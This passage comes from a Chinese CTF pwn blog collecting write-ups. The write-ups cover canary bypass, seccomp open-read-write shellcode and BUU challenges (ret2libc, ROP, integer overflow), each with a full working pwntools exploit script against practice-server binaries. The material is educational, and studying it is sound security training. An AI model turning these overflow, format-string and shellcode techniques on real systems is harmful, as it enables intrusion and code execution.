<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>p = process(&#x27;./Mary_Morton&#x27;)<br>p.recvuntil(&#x27;3. Exit the battle&#x27;)<br>p.sendline(&#x27;2&#x27;)<br>p.sendline(&quot;%23$p&quot;)<br>p.recvuntil(&#x27;0x&#x27;)<br>canary = int(p.recv(16),16)<br>log.success(&quot;canary==&gt;&quot; + hex(canary))<br>system = 0x4008DA<br>payload = &#x27;a&#x27;*0x88 + p64(canary) + p64(0xdeadbeef) + p64(system)<br>p.sendline(&#x27;1&#x27;)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以像上面一样直接泄露canary了</p>
<h3 id="例题：-BJDCTF-2nd-r2t4"><a href="#例题：-BJDCTF-2nd-r2t4" class="headerlink" title="例题：[BJDCTF 2nd]r2t4"></a>例题：[BJDCTF 2nd]r2t4</h3><p>程序比较简单，分析下<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/28.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/28.png"  ><span class="image-caption">img</span></a><br>存在溢出存在格式化字符串漏洞有canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/29.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/29.png"  ><span class="image-caption">img</span></a><br>有后门<br>直接改写__stack_chk_fail@got为backdoor<br>这个题限制不多，可以直接用fmtstr_payload模块一把梭<br>当然也可以手动构造<br>但是我还没做手动构造打的（懒🐕</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.log_level = &#x27;debug&#x27;<br>p=remote(&quot;node3.buuoj.cn&quot;,28676)<br>#p = process(&quot;./r2t4&quot;)<br>elf = ELF(&quot;./r2t4&quot;)<br>libc = elf.libc<br>stack_check = 0x601018<br>flag_addr = 0x400626<br>payload = fmtstr_payload(6,&#123;stack_check:flag_addr&#125;).ljust(40,&#x27;a&#x27;)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>以上就是我对于canary保护的绕过姿势的总结，可能还有我暂时没有涉及到的，也欢迎师傅们提点我一下，这篇博客也算是多天没学习以来的一个新开端吧<br>文中所有的例题和我做分享时的ppt已经上传<a href="https://github.com/N0vice21/Bypass_canary_demo">github</a></p>
<p>参考链接：<br><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://ctf-wiki.org/pwn/linux/mitigation/canary/">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>沙箱入门题</title>
    <url>/2021/05/22/2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h2 id="背景前置"><a href="#背景前置" class="headerlink" title="背景前置"></a>背景前置</h2><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
<p><code>orw_seccomp函数</code>执行了两次<code>prctl</code>函数（出现prctl就是沙箱的题目）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">第一次调用prctl函数 ————禁止提权<br>第二次调用prctl函数 ————限制能执行的系统调用只有open，<span class="hljs-built_in">write</span>，<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>意思就是我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag</p>
<h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p>
<p>首先checksec完，发现只开了canary，放入ida看看。发现，可以输入数据，然后还能对输入的数据进行执行调用。因为这开启沙箱，系统调用是无法执行的，只能通过open打开flag，然后read读到缓冲区上，再通过write泄露出来，从而得到flag</p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p>
<p>第一个exp是自己去构造执行指令，第二个是用pwntool里面自带的shellcraft的功能。相比之下，第二个会更方便许多</p>
<p>exp的详细解析：（来自<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099）</a></p>
<p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">push 0x0  			#字符串结尾<br>push 0x67616c66		#&#x27;flag&#x27;<br>mov ebx,esp			<br>xor ecx,ecx			#0<br>xor edx,edx			#0<br>mov eax,0x5			#调用号<br>int 0x80			#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure>

<p> 读flag文件，sys_read(3,file,0x100)；系统调用号为3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x100;	#对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure>


<p>输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x4;	# eax = sys_write<br>mov ebx,0x1;	# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure>

<p>exp1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="二、easy-shellcode"><a href="#二、easy-shellcode" class="headerlink" title="二、easy_shellcode"></a>二、easy_shellcode</h3><p>来自2021NEEPU 纳新CTF上的一道题</p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p>
<p>虽然保护全开，但是，是用orw的，无所谓</p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p>
<p><img src="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p>
<p>跟上面很类似，也是有个直接输入点，然后调用执行输入的数据，借用shellcraft，把寄存器改为64位下的即可获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>buu05</title>
    <url>/2021/05/09/2021-05-09-buu05/</url>
    <content><![CDATA[<h1 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h1><h3 id="二十六、wustctf2020-getshell"><a href="#二十六、wustctf2020-getshell" class="headerlink" title="二十六、wustctf2020_getshell"></a>二十六、wustctf2020_getshell</h3><p>一道简单题，直接exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28677</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span>+p32(<span class="hljs-number">0x0804851B</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十七、mrctf2020-easyoverflow"><a href="#二十七、mrctf2020-easyoverflow" class="headerlink" title="二十七、mrctf2020_easyoverflow"></a>二十七、mrctf2020_easyoverflow</h3><p>虽然checksec完，保护全开了，但是程序很简单，真的只是溢出覆盖即可，就不多说了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28551</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十八、cmcc-pwnme1"><a href="#二十八、cmcc-pwnme1" class="headerlink" title="二十八、cmcc_pwnme1"></a>二十八、cmcc_pwnme1</h3><p>这题，本来是平常的ret2libc的，但是，靠，给坑了</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509212554-1622863156087.png"></p>
<p>是的，这里给了个“后门函数”！，假的，害我一直想为什么不能获取，以为是不是接收出了问题。原因却是home里面是不存在flag的，怎么可能获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27186</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr=<span class="hljs-number">0x08048624</span><br>p.sendlineafter(<span class="hljs-string">&quot;6. Exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xA8</span>+p32(puts_plt)+p32(addr)+p32(puts_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr ----&gt;&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload =<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十九、jarvisoj-level1"><a href="#二十九、jarvisoj-level1" class="headerlink" title="二十九、jarvisoj_level1"></a>二十九、jarvisoj_level1</h3><p>常规checksec一下</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509215951-1622863179022.png"></p>
<p>发现什么都没开，第一想法就是注入shellcode，结果。。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220210-1622863188055.png"></p>
<p>结果ida里面竟然确实是给了buf的地址，再加上</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220530-1622863189908.png"></p>
<p>嗯，好家伙，直接shellcode了，然后。。。远程不通，本地通了，没想明白，跑去百度了，结果发现，远程连接，竟然是先输入，再输出栈上的buf地址，靠！然后方法就变成了ret2libc了</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220817-1622863191858.png"></p>
<p>这波竟然是给的附件不准确，见识到了！就跟ida里面栈偏移可能会错一样，以后多多注意自己动手进行调试和连接</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26819</span>)<br><span class="hljs-comment">#p=process(&#x27;./level1&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-string">context.os=&#x27;linux&#x27;</span><br><span class="hljs-string">context.arch=&#x27;i386&#x27;</span><br><span class="hljs-string">p.recvuntil(&quot;this:0x&quot;)</span><br><span class="hljs-string">buf_addr=int(p.recv(8),16)</span><br><span class="hljs-string">print hex(buf_addr)</span><br><span class="hljs-string">shellcode=asm(shellcraft.sh())</span><br><span class="hljs-string">payload=(shellcode).ljust(0x8c,&#x27;a&#x27;)+p32(buf_addr)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&#x27;write addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十、bjdctf-2020-babystack2"><a href="#三十、bjdctf-2020-babystack2" class="headerlink" title="三十、bjdctf_2020_babystack2"></a>三十、bjdctf_2020_babystack2</h3><p>常规checksec</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212002.png"></p>
<p>保护没开几个，进入ida静态分析一波，</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212030.png"></p>
<p>代码很简单，输入一个数字，不能超过10，然后这个数值作为后续输入的大小，并且能看左边有给后门函数，那么就是溢出劫持rip即可，认真观察，输入的nbytes前面是int，后面却是unsigned了，所以存在整型溢出，输入一个负数，即可变为很大的整数</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26091</span>)<br>get_shell=<span class="hljs-number">0x0400726</span><br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(get_shell)<br>p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十一、jarvisoj-level3-x64"><a href="#三十一、jarvisoj-level3-x64" class="headerlink" title="三十一、jarvisoj_level3_x64"></a>三十一、jarvisoj_level3_x64</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516114609-1621136841078.png"></p>
<p>程序很简单，应该是道rop，有溢出点，有write泄露函数，这题考点应该是在于是64位程序，使用寄存器传参，而write的参数需要三个寄存器才行，我第一个想到的是ret2csu，刚好有三个前三个寄存器，没想到，没利用成功，不知道为什么。有师傅知道的话，恳请指点一番！感激不尽！</p>
<p>然后就是百度了一下，发现这题有趣，使用ROPgadget可以找到rdi和rsi两个寄存器，而第三个rdx寄存不需要去控制，里面的值已经存有200，可以直接使用了，所以就是正常构造rop即可</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516115336.png"></p>
<p>所以这题得到的就是，要多观察我们需要构造的寄存器里面的值是否已经可以使用，需不需要额外构造</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25077</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pppppp_ret=<span class="hljs-number">0x4006aa</span>     <span class="hljs-comment">#pop_rbx_rbp_r12_r13_r14_r15_ret</span><br>mov_rdx_rsi_edi=<span class="hljs-number">0x400690</span><br>ret=<span class="hljs-number">0x400499</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pp_ret=<span class="hljs-number">0x4006b1</span>    <span class="hljs-comment">#pop_rsi_r15_ret</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload=&#x27;a&#x27;*0x88+p64(pppppp_ret)</span><br><span class="hljs-string">payload+=p64(0)*2+p64(ret)+p64(8)+p64(read_got)+p64(1)</span><br><span class="hljs-string">payload+=p64(mov_rdx_rsi_edi)+p64(write_plt)+p64(main)</span><br><span class="hljs-string">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">write=u64(p.recv(6).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-string">log.info(&quot;wirte addr:&quot;+hex(write))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x88</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)			<br>payload += p64(pp_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>)	<br>payload += p64(write_plt)					<br>payload += p64(main)									<br>p.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload)<br>read = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))	<br>log.info(<span class="hljs-string">&quot;read addr:&quot;</span>+<span class="hljs-built_in">hex</span>(read))<br>libc = LibcSearcher(<span class="hljs-string">&quot;read&quot;</span>,read)<br>libc_base = read - libc.dump(<span class="hljs-string">&quot;read&quot;</span>)<br>system = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input:&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十二、jarvisoj-level4"><a href="#三十二、jarvisoj-level4" class="headerlink" title="三十二、jarvisoj_level4"></a>三十二、jarvisoj_level4</h3><p>32位的rop，就没有上面那么麻烦了，直接在栈上写就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="三十三、picoctf-2018-rop-chain"><a href="#三十三、picoctf-2018-rop-chain" class="headerlink" title="三十三、picoctf_2018_rop chain"></a>三十三、picoctf_2018_rop chain</h3><p>常规32位rop即可getshell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27038</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>,payload)<br>printf=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf addr:&quot;</span>+<span class="hljs-built_in">hex</span>(printf))<br>libc=LibcSearcher(<span 